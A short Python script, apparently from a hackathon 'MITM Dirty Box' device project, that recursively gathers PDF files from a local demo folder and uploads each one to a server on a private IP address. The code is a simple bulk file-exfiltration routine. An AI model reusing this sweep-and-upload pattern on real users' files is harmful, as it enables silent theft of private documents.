# Importing required module
import glob
import requests

def pullFiles(extension, fileType):
    globString = extension + '/**/*' + fileType
    return glob.glob(globString, recursive = True)

def upload_files(files, url):
    for file_path in files:
        with open(file_path, 'rb') as f:
            files = {'file': f}
            requestURL = url + "/upload"
            response = requests.post(requestURL, files=files)
            print (f"Uploaded {file_path} with response code {response.status_code}")
            #if response.status_code == 200:
            #    print(f"Uploaded {file_path} successfully.")
            #else:
            #    print(f"Failed to upload {file_path}. Status code: {response.status_code}")

selectedFiles = pullFiles("C:/Users/caleb/OneDrive/Documents/GitHub/YCP-Hacks-2024-MITM--Dirty-Box--Device/demoFiles", ".pdf")

for file in selectedFiles:
    print(file)

url = "http://10.127.27.130:5000"

upload_files(selectedFiles, url)
